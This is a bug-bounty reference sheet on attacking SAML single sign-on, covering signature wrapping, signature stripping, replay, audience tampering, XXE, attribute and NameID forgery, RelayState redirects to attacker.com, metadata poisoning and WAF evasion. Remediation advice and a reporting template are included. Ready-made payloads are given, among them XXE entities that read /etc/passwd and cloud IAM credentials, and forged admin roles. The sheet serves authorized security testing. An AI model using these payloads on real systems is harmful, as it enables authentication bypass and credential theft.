# SAML Attack Reference — Single Sign-On Security Testing
> Source: ws-attacks.org, Gajek et al. XSW whitepaper, epi052 SAML methodology, IBM XSW guide, bugbounty.info SSO playbook | RAG Knowledge Base | Full detail preserved
> CWE: CWE-347 (Improper Verification of Cryptographic Signature), CWE-345 (Insufficient Verification of Data Authenticity), CWE-287 (Improper Authentication)
> Related: `auth-bypass.md`, `bug-chains.md` (CHAIN-018), `portswigger-advanced.md` (OAuth/JWT)

---

## Overview — Why SAML Matters for Bug Bounty

Security Assertion Markup Language (SAML) 2.0 is the dominant enterprise SSO protocol. Every target with "Login with Okta", "Azure AD SSO", "OneLogin", "Google Workspace SAML", or corporate IdP login is a SAML attack surface.

**High-value targets:**
- B2B SaaS with enterprise SSO tier
- Internal admin panels federated to corporate IdP
- Cloud consoles (AWS SSO, GCP Workforce Identity)
- Any SP accepting SAML Responses at `/saml/acs`, `/sso/saml`, `/auth/saml/callback`

**Core architecture:**
```
User → SP (Service Provider) → redirects to IdP (Identity Provider)
User authenticates at IdP
IdP → POST SAML Response (signed XML) → SP Assertion Consumer Service (ACS)
SP validates signature → extracts NameID/attributes → creates session
```

**Two processing paths = attack surface:**
1. **SSO Verificator** — validates XML digital signature on specific element (by ID in Reference URI)
2. **SSO Processor** — extracts NameID, attributes, conditions for session creation

**XSW root cause:** Verificator and Processor disagree on which XML element to use.

---

## SAML Response Structure (Reference)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                ID="_response_id_here"
                Version="2.0"
                IssueInstant="2024-01-01T00:00:00Z"
                Destination="https://sp.example.com/saml/acs">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
      <ds:Reference URI="#_response_id_here">
        <ds:Transforms>...</ds:Transforms>
        <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
        <ds:DigestValue>...</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
    <ds:KeyInfo>
      <ds:X509Data><ds:X509Certificate>...</ds:X509Certificate></ds:X509Data>
    </ds:KeyInfo>
  </ds:Signature>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                  ID="_assertion_id_here"
                  Version="2.0"
                  IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
        user@example.com
      </saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2024-01-01T01:00:00Z"
                                       Recipient="https://sp.example.com/saml/acs"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2024-01-01T01:00:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>https://sp.example.com</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z"
                         SessionIndex="_session_index">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue>User</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

**Key elements for attacks:**
- `Response` ID — referenced by signature
- `Assertion` ID — may be separately signed
- `NameID` — identity the SP logs in as
- `AttributeStatement` — roles, groups, email
- `Conditions/Audience` — must match SP
- `SubjectConfirmationData/Recipient` — must match ACS URL
- `RelayState` — opaque state parameter, often URL

---

## Testing Methodology

### Phase 1 — Recon
1. Identify SSO login button → capture redirect to IdP
2. Complete legitimate login → intercept SAML Response POST to ACS
3. Note ACS URL, binding (HTTP-POST most common), NameID format
4. Check IdP type: Okta, Azure AD, ADFS, OneLogin, Google, custom
5. Browser extensions: **SAML-tracer** (Firefox/Chrome), **Burp SAML Raider**

### Phase 2 — Baseline Capture
1. Export valid SAML Response from Burp history
2. Load in SAML Raider → verify signature validates
3. Document: signed element (Response vs Assertion), signature type (enveloped/enveloping/detached)

### Phase 3 — Attack Testing (Ordered)
```
1. Signature bypass (none, wrong key, comment injection)
2. XSW variants 1-8 (SAML Raider automated)
3. Assertion replay
4. Condition/audience tampering
5. Encrypted assertion manipulation
6. XXE in SAML XML
7. Attribute/NameID injection without invalidating signature
8. RelayState open redirect / SSRF
9. Metadata poisoning (if you control IdP config)
```

### Phase 4 — Impact Confirmation
- Session cookie issued for injected identity?
- Admin panel access?
- Can you access other users' data?

### Tools
| Tool | Purpose |
|---|---|
| Burp Suite + SAML Raider | XSW, cert management, message editor |
| SAML-tracer | Capture Responses in browser |
| samltool.com | Encode/decode, cert format conversion |
| xmlsec1 | Command-line signature verification |
| OpenSAML / python3-saml | Local testing harness |
| CyberChef | Base64 inflate of SAMLResponse param |

---

## Attack Class 1: XML Signature Wrapping (XSW)

**CWE-347** | Most common critical SAML bug

### Concept
The signature validator finds element by `Reference URI="#ID"` and validates it. The business logic extracts NameID using different navigation — e.g., `getElementsByTagName("Assertion")[0]` or first NameID in document tree. Attacker inserts **unsigned malicious assertion** that parser picks up **before** or **instead of** signed one.

**Requires:** Valid signed SAML Response (from your own account login) as starting point.

### XSW Variant Overview (8 Classic Attacks)

| Variant | Target element | Technique |
|---|---|---|
| XSW #1 | Response | Copy Response+Assertion, insert original Signature as child of copy; enveloping signature |
| XSW #2 | Response | Same placement as #1; detached signature type |
| XSW #3 | Assertion | Copy Assertion as first child of Response; original signed Assertion is sibling |
| XSW #4 | Assertion | Copy Assertion inserted after original Signature element |
| XSW #5 | Assertion | Copy Assertion before original Assertion |
| XSW #6 | Assertion | Copy Assertion inside Extensions element |
| XSW #7 | Assertion | Copy in Extensions (bypasses OpenSAML schema ID check) |
| XSW #8 | Assertion | Copy as sibling with same ID (exploits duplicate ID handling) |

### XSW #1 — Response Wrapping (Enveloping)
1. Capture valid SAML Response
2. SAML Raider → Signature Wrapping Attacks → XSW #1
3. Modify injected copy's NameID to `admin@target.com`
4. Forward to ACS
5. If SP processes unsigned copy → authentication bypass

### XSW #3 — Assertion Wrapping (Most Common)
1. Valid Response with signed Assertion
2. Raider inserts **copy** of Assertion as first child of Response
3. In copy: change NameID to target user/admin
4. Signature still validates original Assertion by ID
5. Vulnerable SP extracts first Assertion in document → attacker's

### XSW #7 — Extensions Bypass
Developed against OpenSAML library countermeasure that compared assertion IDs during validation. Assertions placed inside `<Extensions>` element (less restrictive schema) bypass ID uniqueness checks in some implementations.

### Vulnerable SP Patterns (Look For)
```java
// VULNERABLE — takes first match, not signature-referenced element
document.getElementsByTagName("NameID").item(0)
document.getElementsByTagNameNS("*", "Assertion").item(0)
```

```java
// SAFER — resolve element by ID from Reference URI
Element signed = document.getElementById(referenceURI.substring(1));
```

### Testing with SAML Raider
1. Install: Burp → Extender → BApp Store → SAML Raider
2. Intercept SAML Response POST to ACS
3. SAML Raider tab → **Signature Wrapping Attacks** → run #1 through #8
4. For each variant: change NameID in injected element to admin email
5. Forward → check if session established
6. Note which variants succeed → indicates parser behavior

### Impact
- Authentication bypass as arbitrary user (including admin)
- Privilege escalation via Attribute injection in unsigned assertion
- Critical severity — full SSO bypass

### Remediation (For Reports)
- Bind attribute extraction strictly to signature-verified element ID
- Schema validation before processing
- Reject documents with duplicate IDs
- Use well-maintained SAML libraries (OneLogin python3-saml, pac4j) with XSW patches

---

## Attack Class 2: Signature Bypass (Non-XSW)

### 2a — Signature Stripping
Remove entire `<ds:Signature>` block; SP skips validation if misconfigured:
```xml
<!-- Some vulnerable SPs: if no signature present, accept assertion -->
```
Test: delete Signature → forward. If login succeeds → Critical.

### 2b — Empty Signature / Null SignatureValue
```xml
<ds:SignatureValue></ds:SignatureValue>
```
Some parsers treat present-but-empty as "validated."

### 2c — Comment Injection in Signed Content
XML signatures exclude comments in canonicalization (exclusive c14n). Inject inside NameID:
```xml
<saml:NameID>admin@corp.com<!--</saml:NameID><saml:NameID>user@corp.com--></saml:NameID>
```
Validator sees `admin@corp.com`; application may parse differently.

Also: `admin<!-- comment -->@corp.com` — email validation vs signature content mismatch.

### 2d — Certificate / Key Confusion
- SP trusts wrong certificate embedded in Response
- Self-signed cert cloned in SAML Raider replaces IdP cert
- SP uses cert from Response `<KeyInfo>` instead of configured IdP cert
- **Test:** Clone IdP cert in Raider, re-sign with your key, swap cert in Response

### 2e — Algorithm Confusion
- IdP uses RSA-SHA256; SP accepts HMAC-SHA1 with public key as HMAC secret
- Weak algorithms: SHA1-only signatures on legacy ADFS

### 2f — Signature Reference Points to Wrong Element
Modify Reference URI to point to attacker-controlled element while leaving valid SignatureValue from different context (advanced, rare).

---

## Attack Class 3: Assertion Replay

**CWE-294** | Improper Validation of SAML Response Freshness

### Conditions
1. Capture valid SAML Response
2. Replay same Response to ACS multiple times
3. If SP doesn't track `AssertionID` or `SessionIndex` → each replay creates new session

### Variations
- **Cross-SP replay:** Same IdP signs for multiple SPs; replay Response meant for SP-A at SP-B (if Audience not enforced)
- **Expired assertion:** Replay after `NotOnOrAfter` — if SP ignores Conditions
- **Removed InResponseTo check:** Response stolen from different auth flow still accepted

### Testing
1. Save Response from successful login
2. Logout
3. Re-POST same Response to ACS (Burp Repeater)
4. If session created → replay vulnerability

### Impact
- Session fixation, unauthorized access without IdP credentials
- High to Critical depending on MFA bypass

---

## Attack Class 4: Condition / Audience Tampering

Modify unsigned portions (if signature covers only partial document):

```xml
<saml:Conditions NotBefore="..." NotOnOrAfter="2099-01-01T00:00:00Z">
  <saml:AudienceRestriction>
    <saml:Audience>https://attacker-sp.com</saml:Audience>
  </saml:AudienceRestriction>
</saml:Conditions>
```

If Conditions outside signed portion → extend validity or change audience.

**Test:** Extend `NotOnOrAfter` to future; change `Audience` to different SP you control.

---

## Attack Class 5: Encrypted Assertion Attacks

When assertions are encrypted (`<saml:EncryptedAssertion>`):

### 5a — Strip Encryption
Remove `<EncryptedAssertion>`, replace with plaintext `<Assertion>` — if SP accepts unsigned plaintext when encryption expected.

### 5b — Encrypted Assertion Wrapping
Similar to XSW but with encrypted blobs — wrap malicious plaintext alongside valid encrypted assertion.

### 5c — Key Transport Weakness
Weak encryption key in `EncryptedKey` — RSA padding oracle (rare, advanced).

---

## Attack Class 6: XXE in SAML XML

If SP parses SAML XML with external entities enabled:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>
  ...
  <saml:AttributeValue>&xxe;</saml:AttributeValue>
</samlp:Response>
```

**SSRF via XXE:**
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

**Impact:** File read, SSRF, sometimes RCE
**Related:** `portswigger-injection.md` (XXE)

---

## Attack Class 7: Attribute Injection / Privilege Escalation

Modify attributes in unsigned assertion (via XSW) or tamper if attributes not in signed portion:

```xml
<saml:Attribute Name="Role">
  <saml:AttributeValue>Administrator</saml:AttributeValue>
</saml:Attribute>
<saml:Attribute Name="Groups">
  <saml:AttributeValue>Domain Admins</saml:AttributeValue>
</saml:Attribute>
<saml:Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/role">
  <saml:AttributeValue>GlobalAdmin</saml:AttributeValue>
</saml:Attribute>
```

**Common attribute names by platform:**
| Platform | Privilege attributes |
|---|---|
| Azure AD | `http://schemas.microsoft.com/ws/2008/06/identity/claims/role`, `groups` |
| Okta | `groups`, custom app attributes |
| ADFS | `role`, `http://schemas.xmlsoap.org/claims/Group` |
| AWS SSO | `https://aws.amazon.com/SAML/Attributes/Role` |

---

## Attack Class 8: NameID Manipulation

Change identity in unsigned/injected assertion:
```xml
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
  admin@target.com
</saml:NameID>
```

**Formats to test:**
- `emailAddress` — email as identity
- `persistent` — opaque ID (try other users' known IDs from IDOR)
- `transient` — session-specific
- `unspecified` — implementation-defined

**Horizontal escalation:** Change NameID to another user's email/ID.
**Vertical escalation:** Change to known admin account.

---

## Attack Class 9: RelayState Attacks

`RelayState` parameter sent with SAML Response — often contains return URL after login.

### 9a — Open Redirect via RelayState
```
POST /saml/acs
SAMLResponse=...&RelayState=https://attacker.com
```
If SP redirects to RelayState without validation → open redirect.

### 9b — SSRF via RelayState
Some SPs fetch RelayState URL server-side.

### 9c — CSRF / Forced Login
Craft SAML Response + RelayState to force victim to land on attacker-chosen page while logged in as attacker-controlled account (Login CSRF variant).

---

## Attack Class 10: Metadata Poisoning

If you can modify SP or IdP metadata (misconfigured admin panel, exposed XML):

```xml
<!-- In SP metadata — point ACS to attacker server -->
<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
                          Location="https://attacker.com/acs"
                          index="0"/>
```

Or inject attacker's cert as trusted IdP signing key.

**Recon:** `/saml/metadata`, `/FederationMetadata/2007-06/FederationMetadata.xml`, `/.well-known/saml-metadata`

---

## Attack Class 11: SAML Request Manipulation

Outbound AuthnRequest from SP to IdP:

### Spoofed Issuer
Modify `Issuer` in AuthnRequest to impersonate different SP.

### Unsigned AuthnRequest
Some IdPs accept unsigned requests — craft request for victim user (if combined with IdP bugs).

### XML Injection in AuthnRequest
Inject XML into `NameIDPolicy`, `RequestedAuthnContext`.

---

## Platform-Specific Notes

### Okta
- Admin console: `/admin/sso` — check SAML app config
- Often uses signed Assertions (not Response)
- Test XSW on Assertion-level signatures
- Okta Session Cookie separate from app session after SAML

### Azure AD / Microsoft Entra ID
- SAML + WS-Federation coexist
- Long `NameID` URNs for claims
- `groups` claim overflow → check `groups:` overage claim bypass
- Enterprise app "User Assignment Required" — bypass if SAML accepted without assignment check

### ADFS (Active Directory Federation Services)
- Legacy SHA1 signatures common
- `/adfs/ls/` endpoint
- Extended attributes from AD LDAP
- Golden SAML (forge assertions with stolen AD FS token signing cert) — post-compromise, not typical BB

### OneLogin
- `/trust/saml2/http-post/sso/` ACS patterns
- Multiple certificates in metadata — test wrong cert acceptance

### Google Workspace SAML
- Strict audience validation usually
- Test subdomain apps with separate SP configs

---

## SAML vs OAuth/OIDC Decision Tree

```
Login redirect to /oauth/authorize? → OAuth/OIDC (see portswigger-advanced.md)
Login redirect to IdP with SAMLRequest param → SAML
POST with SAMLResponse param → SAML ACS
Login with "Enterprise SSO" / "SAML" label → SAML
JWT in fragment after redirect → OIDC implicit/hybrid
```

Many apps support **both** — test each independently.

---

## Bug Bounty Reporting Template

```markdown
## Summary
SAML XML Signature Wrapping (XSW #3) on /saml/acs allows authentication bypass as arbitrary user including admin accounts.

## Steps
1. Login with valid test account → capture SAML Response
2. Use SAML Raider XSW #3 to inject assertion with NameID admin@target.com
3. POST modified Response to ACS
4. Session established as admin — screenshot

## Impact
Complete authentication bypass of enterprise SSO. Attacker with any valid IdP account (or stolen Response) can impersonate any user.

## CWE
CWE-347: Improper Verification of Cryptographic Signature

## Remediation
- Extract attributes only from element ID referenced in ds:Reference
- Reject duplicate Assertion IDs
- Upgrade OpenSAML / use patched library
```

---

## Detection / WAF Bypass Tips

- SAML Responses are Base64-encoded XML in POST body — WAFs often don't inspect
- Large XML payloads — test size limits
- Deflate compression: `Content-Encoding: deflate` on SAMLRequest/Response
- Double encoding in RelayState

---

## References

- Gajek et al. — "On Breaking SAML: Be Whoever You Want to Be" (XSW whitepaper)
- ws-attacks.org — XML Signature Wrapping taxonomy
- epi052 — How to Hunt Bugs in SAML Methodology Parts I & II
- SAML Raider — https://github.com/SAMLRaider/SAMLRaider
- OWASP — SAML Security Cheat Sheet
- CWE-347, CWE-345, CWE-287, CWE-294

---

## Chain References

See `bug-chains.md`:
- **CHAIN-018:** SAML XSW → Authentication Bypass → Admin SSO
- **CHAIN-001:** Subdomain takeover + SAML (if ACS on taken subdomain)
- **CHAIN-004:** XXE in SAML → SSRF → IMDS
